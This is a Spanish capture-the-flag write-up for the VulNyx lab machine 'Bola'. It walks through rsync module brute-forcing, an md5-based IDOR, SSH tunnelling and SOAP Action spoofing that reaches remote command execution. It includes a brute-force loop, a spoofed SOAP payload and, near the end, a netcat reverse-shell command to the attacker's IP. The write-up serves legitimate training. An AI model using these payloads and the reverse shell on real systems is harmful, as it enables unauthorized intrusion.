# Bola — VulNyx (Write-up)

## Introducción

Muy buenas y bienvenidos a la resolución de la máquina **Bola** de VulNyx. Esta es otra de las máquinas que hago para la plataforma; en este caso es una máquina muy útil para entender varias técnicas de **hacking web**. La recomiendo mucho para quienes quieran presentarse al **CBBH**.

A continuación, las técnicas que nos encontraremos:

- **Information Disclosure** — Fuga de usuarios vía `/.well-known/openid-configuration` y `security.txt`.
- **Rsync Bruteforce** — Fuga de email y contraseña dentro de una extensión de Firefox (en caché).
- **BOLA (Broken Object Level Authorization) / IDOR** — PDF en md5 que filtra un puerto interno y una contraseña.
- **WSDL (Web Services Description Language)** — SOAP Action Spoofing.

---

## Reconocimiento

Lo primero es buscar la IP de la máquina. Hay varias maneras de hacerlo; en este caso me gusta usar `fping` para el primer recon de IPs, pero se puede hacer con `nmap`, `arp-scan` y varias herramientas más.

```bash
nmap -sSCV -p- -T5 192.168.93.132
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 12:55 CET
Nmap scan report for 192.168.93.132
Host is up (0.00077s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey:
|   256 65:bb:ae:ef:71:d4:b5:c5:8f:e7:ee:dc:0b:27:46:c2 (ECDSA)
|_  256 ea:c8:da:c8:92:71:d8:8e:08:47:c0:66:e0:57:46:49 (ED25519)
80/tcp  open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Did not follow redirect to http://bola.nyx
873/tcp open  rsync   (protocol version 32)
MAC Address: 00:0C:29:4E:5B:18 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Información importante del Nmap:

|Puerto|Servicio|Observación|
|---|---|---|
|`22`|SSH|Nada.|
|`80`|HTTP|Redirect a `bola.nyx`.|
|`873`|rsync|Puede haber algo interesante aquí…|

Añadimos `bola.nyx` al `/etc/hosts` con el siguiente comando (o de forma manual):
```bash
echo "<IP> bola.nyx" >> /etc/hosts
```

### Vhost bola.nyx

Empecemos simplemente mirando qué hay dentro de `bola.nyx`. Como podemos ver, es la plataforma de VulNyx pero con una nueva funcionalidad: parece que han añadido la posibilidad de iniciar sesión.

Todavía no tenemos credenciales válidas, así que el siguiente paso es hacer fuzzing al sitio. Antes de usar herramientas como `ffuf` o `wfuzz`, siempre corro primero `dirsearch` con su wordlist básica, ya que `dirsearch` te da extensiones como `php`, `aspx`, `jsp`, `html`, `js` por defecto, lo cual es muy cómodo para un fuzzing básico.
```bash
dirsearch -u http://bola.nyx
```

Y obtenemos los siguientes directorios y archivos:

- `/admin/admin.php` → Redirige a `/login/login.php`.
- `download.php` → Redirige a `/login/login.php` — puede que necesitemos credenciales para acceder.
- `Javascript/` → Directorio sin listado (403 si accedemos).
- `/.well-known/` → Directorio con 2 archivos:
    - `security.txt`
    - `openid-configuration`

Todavía no podemos hacer nada con lo que encontramos, y menos con el directorio `/.well-known`. Antes de meternos en los archivos que hay dentro, entendamos qué es este directorio.

### ¿Qué es el directorio /.well-known?

`.well-known` es un estándar que sirve como un directorio normalizado dentro del dominio raíz de un sitio web, normalmente ubicado en `/.well-known/` en el servidor. Centraliza metadatos críticos del sitio, incluyendo archivos de configuración e información relacionada con sus servicios, protocolos y mecanismos de seguridad (por ejemplo, `https://example.com/.well-known/security.txt`).

Recurso útil cuando te enfrentas a un directorio `/.well-known` — lista los archivos más populares que puede contener, así puedes armarte una wordlist personalizada y reutilizarla en el futuro: [moul/awesome-well-known](https://github.com/moul/awesome-well-known) (RFC 5785).

### /.well-known/security.txt

Este archivo contiene información de contacto para que los investigadores de seguridad reporten vulnerabilidades (RFC 9116). Solo tiene el mail que ya teníamos.

### /.well-known/openid-configuration

Este archivo define detalles de configuración para OpenID Connect, una capa de identidad sobre el protocolo OAuth 2.0. Contiene usuarios y mails:
- `d4t4s3c` — d4t4s3c@nyx.com
- `jackie0x17` — jackie0x17@nyx.com
- `ct0l4` — ct0l4@nyx.com

Así que tenemos una lista de usuarios que puede sernos útil en el futuro, una vez que encontremos una contraseña.

---

## Rsync

Rsync es una utilidad para transferir y sincronizar archivos entre un equipo y una unidad de almacenamiento, y entre equipos en red, comparando los tiempos de modificación y los tamaños de los archivos.

### Enumeración básica

Lo primero para comprobar este servicio (puerto 873) es:
```bash
rsync rsync://bola.nyx/
```

No pasó nada. Necesitamos entender cómo funciona rsync. Cuando instalas el servicio, el archivo de configuración se ve así:
```ini
# Global config
uid = nobody
gid = nogroup
use chroot = no
max connections = 5
log file = /var/log/rsync.log
pid file = /var/run/rsyncd.pid
dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

# Define the module that will share /opt
[public_files]
    path = /opt
    comment = VulNyx Public Files
    read only = yes
    list = yes
```

La línea clave es `list = yes`. Hay 2 opciones para esa variable:

- `list = yes` → Le da al usuario la capacidad de listar recursos aunque no conozca el nombre del recurso.
- `list = no` → **No** le da al usuario la capacidad de listar recursos sin conocer el nombre.

La máquina a la que nos enfrentamos está en `no`, así que si no podemos listar los módulos compartidos, tenemos que hacerles fuzzing.

### Bruteforce del módulo rsync

VulNyx tiene su propia herramienta para hacer fuzzing al servicio rsync: [VulNyx/Arsenal → rsync-brute](https://github.com/VulNyx/Arsenal/tree/main/rsync-brute).

Pero puedes hacerte tu propia herramienta para fuzzearlo, como esta:

```bash
for PATH in $(cat /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt); do
  rsync --timeout=5 rsync://bola.nyx/$PATH &>/dev/null && echo "[+] Recurso encontrado: $PATH"
done
```

Recomiendo la herramienta `rsync-brute`, ya que el bucle `for` a veces se cuelga y no funciona correctamente 😂.

```bash
./rsync-brute -t bola.nyx -p 873 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

`rsync-brute` encontró un módulo compartido llamado **`extensions`**. Dentro hay 2 archivos:

- `Password_manager_FirefoxExtension-VulNyx.pdf`
- `password_manager.zip`

```bash
rsync -avz rsync://bola.nyx/extensions/<archivo_a_descargar>
```

- `-a` → Mantiene permisos, fechas, propietarios y estructura de carpetas.
- `-v` → Muestra cada archivo a medida que se descarga.
- `-z` → Comprime los datos durante la transferencia para hacerla más rápida.

Abrimos el `.pdf` para ver cómo instalar la extensión de Firefox. En Firefox, vamos a la barra de direcciones e ingresamos:

```
about:debugging#/runtime/this-firefox
```

Seleccionamos `password_manager.zip`. Una vez instalada, abrimos la extensión — parece haber credenciales en la caché.

Ahora que tenemos lo que parecen credenciales válidas, podemos iniciar sesión en `bola.nyx`.

---

## BOLA (Broken Object Level Authorization) / IDOR

Cuando accedemos al VulNyx Portal Manager, vemos un documento con nombre en md5, y su propietario es **Jackie0x17**.

Al hacer clic, se descarga un PDF que parece hablar de un servidor WSDL (volveremos a esto más adelante, es una referencia para el futuro).

Si nos encontramos con un `.pdf` o cualquier archivo nombrado en md5, lo primero que hay que pensar es: **¿y si usaron el propio nombre del usuario para asignar el nombre del archivo?**

Algunos ejemplos de lo que podríamos encontrar:

- `?filename=ZmlsZV8xMjQucGRm`
- `download.php?filename=c81e728d9d4c2f636f067f89cc14862c` (nuestro caso).

Puedes encontrar de todo: base64, `xxd` o md5. Incluso hay quienes primero cogen `jackie0x17`, lo codifican a base64 y luego hashean ese base64 a md5. Estas son las combinaciones típicas cuando encontramos hashing/encoding en aplicaciones web, usadas a menudo para enmascarar los objetos referenciados.

### Comprobar si el usuario coincide con el md5

Antes, en `openid-configuration`, listamos varios usuarios — puede que haya otros PDFs referenciando a otros usuarios. Probemos con el usuario `d4t4s3c`.

### PDF del usuario d4t4s3c

Hay un PDF conectado al usuario `d4t4s3c` (en md5), y parece ser un tutorial sobre cómo conectarse al servidor WSDL de VulNyx. Revisando el documento, encontramos 2 cosas muy interesantes:

- Una contraseña vinculada a un usuario admin.
- Un nuevo puerto, aparentemente interno.

Cuando intentamos conectarnos por SSH con el usuario `d4t4s3c`, la contraseña es válida.

### Port Forwarding — Puerto 9000

Sabiendo que hay un nuevo puerto interno `9000` corriendo por detrás, y ahora que tenemos credenciales válidas, podemos hacer port forwarding por SSH. Al conectarnos, creamos un túnel que hace que el puerto interno 9000 sea nuestro, y así podemos acceder a él:

```bash
ssh -L 9000:127.0.0.1:9000 d4t4s3c@<ip-victima>
```

Una vez accedemos a `localhost:9000`, nos muestra el **servidor WSDL**.

---

## WSDL (Web Services Description Language)

Antes de intentar nada con este servidor, primero necesitamos saber a qué tecnología nos enfrentamos.

- WSDL es un archivo basado en XML expuesto por los servicios web que informa a los clientes de los servicios/métodos disponibles, incluyendo dónde residen y la convención de llamada a cada método.
- El WSDL no debería estar siempre accesible — los desarrolladores pueden no querer exponer públicamente el archivo WSDL de un sitio, o pueden exponerlo en una ubicación inusual.
- Si no lo encontramos expuesto, podemos hacer fuzzing de directorios/parámetros buscando revelar su ubicación.

En este caso, ya sabemos que hay un archivo WSDL → `/wsdl`.

### Desglose del archivo WSDL

Aquí está el archivo completo:

```xml
<definitions name="VulNyxSOAP" targetNamespace="http://localhost/wsdl/VulNyxSOAP.wsdl">
  <message name="LoginRequest">
    <part name="username" element="username"/>
    <part name="password" element="password"/>
  </message>
  <message name="LoginResponse">
    <part name="status" type="string"/>
  </message>
  <message name="ExecuteCommandRequest">
    <part name="cmd" element="cmd"/>
  </message>
  <message name="ExecuteCommandResponse">
    <part name="output" element="cmd"/>
  </message>
  <portType name="VulNyxSOAPPortType">
    <operation name="Login">
      <input message="tns:LoginRequest"/>
      <output message="tns:LoginResponse"/>
    </operation>
    <operation name="ExecuteCommand">
      <input message="tns:ExecuteCommandRequest"/>
      <output message="tns:ExecuteCommandResponse"/>
    </operation>
  </portType>
  <binding name="VulNyxSOAPBinding" type="tns:VulNyxSOAPPortType">
    <soap:binding style="rpc" transport="http://schemas.xmlsoap.org/soap/http"/>
    <operation name="Login">
      <soap:operation soapAction="Login"/>
      <input><soap:body use="literal"/></input>
      <output><soap:body use="literal"/></output>
    </operation>
    <operation name="ExecuteCommand">
      <soap:operation soapAction="ExecuteCommand"/>
      <input><soap:body use="literal"/></input>
      <output><soap:body use="literal"/></output>
    </operation>
  </binding>
  <service name="VulNyxSOAP">
    <port binding="tns:VulNyxSOAPBinding" name="VulNyxSOAPPort">
      <soap:address location="http://localhost:9000/wsdl/"/>
    </port>
  </service>
</definitions>
```

Podemos ver varios messages, operations y portTypes. Estructurémoslo para saber exactamente qué hace.

- **Definition** — El elemento raíz de todos los archivos WSDL. Especifica el nombre del servicio, declara todos los namespaces usados en el documento y define todos los demás elementos del servicio.
    - `VulNyxSOAP` → nombre del servicio.
- **Messages** — Definen la entrada y salida de las operaciones que soporta el servidor web. Es decir, los mensajes que se van a intercambiar, presentados como un documento completo o como argumentos asignados a la invocación de un método.
    - `LoginRequest` tiene estos elementos `<part>`:
        - `<part name="username" element="username"/>` → un campo para poner un usuario.
        - `<part name="password" element="password"/>` → un campo para poner una contraseña.
    - `LoginResponse` tiene un `<part>` que es el resultado del login:
        - `<part name="status" type="string"/>`
    - `ExecuteCommandRequest`:
        - `<part name="cmd" element="cmd"/>` → parece que podemos ejecutar comandos si conseguimos el elemento `<cmd>`.
    - `ExecuteCommandResponse`:
        - `<part name="output" element="cmd"/>` → respuesta de `cmd`.
- **Operation** — Define las acciones SOAP disponibles, junto con la codificación de cada mensaje.
- **PortType** — Encapsula todos los posibles mensajes de entrada y salida en una operación. Define el servicio web, las operaciones disponibles y los mensajes intercambiados. (Nota: en WSDL 2.0, el elemento `interface` define las operaciones y el elemento `type` define los tipos de datos de los mensajes.)

Una vez definidos, el `portType` se ve así:

```xml
<portType name="VulNyxSOAPPortType">
  <operation name="Login">
    <input message="tns:LoginRequest"/>
    <output message="tns:LoginResponse"/>
  </operation>
  <operation name="ExecuteCommand">
    <input message="tns:ExecuteCommandRequest"/>
    <output message="tns:ExecuteCommandResponse"/>
  </operation>
</portType>
```

Después armamos la estructura para llamar a un archivo SOAP WSDL, que se ve así:

```xml
<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns="http://localhost/wsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <ExecuteCommand>
         <cmd>blabla</cmd>
      </ExecuteCommand>
   </soapenv:Body>
</soapenv:Envelope>
```

Los campos `<soapenv:Envelope>` y `<soapenv:Body>` son obligatorios en una llamada.

Si vamos a `localhost:9000` sin entrar al archivo wsdl, obtenemos la estructura mencionada arriba. Lo siguiente sería poner los parámetros que están en el archivo WSDL, referenciándolos y tomándolos del `<operation>`.

### SOAP Action Spoofing

Ahora hacemos una petición a `localhost:9000`, la capturamos con **BurpSuite** y la mandamos al Repeater. Una vez en el Repeater, cambiamos el método de la petición a **POST**, porque para enviar los datos tiene que hacerse por POST.

Si enviamos los datos con los campos de arriba, responde indicando si podemos ejecutar comandos. Nos muestra que esta operación solo puede realizarse en la red interna. Y ahora dirás: ¿entonces qué hacemos?

Parece que cuando usamos `ExecuteCommand`, valida si la petición viene de una red interna antes de ejecutar el comando.

Aquí es donde entra el **SOAP Action Spoofing**. Si el servicio web determina la operación a ejecutar basándose únicamente en el header `SOAPAction`, podemos llamarla mediante ese header y usar la operación `LoginRequest` (que no tiene restricción), y aun así ejecutar comandos:

- Añadir `SOAPAction: ExecuteCommand` a la petición en BurpSuite.
- Cambiar la operación `<ExecuteCommand>` por `<LoginRequest>`.

```
SOAPAction: ExecuteCommand
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns="http://localhost/wsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <LoginRequest>
         <cmd>whoami</cmd>
      </LoginRequest>
   </soapenv:Body>
</soapenv:Envelope>
```

Conseguimos ejecutar comandos incluso con la restricción de la operación, simplemente llamando al SOAPAction en el header de la petición. De esta forma bypasseamos el check de _"Only allowed on internal networks"_ y ejecutamos comandos.

```bash
busybox nc <tu-ip> 4444 -e bash
```

Conseguimos obtener una shell.

---

## Despedida

Aquí termina el writeup de la máquina **Bola**. Espero que lo hayáis disfrutado y aprendido mucho.

¡Nos vemos y Happy Hacking! 😄

---

_Write-up de la máquina **Bola** — VulNyx · Recomendada para preparación del CBBH._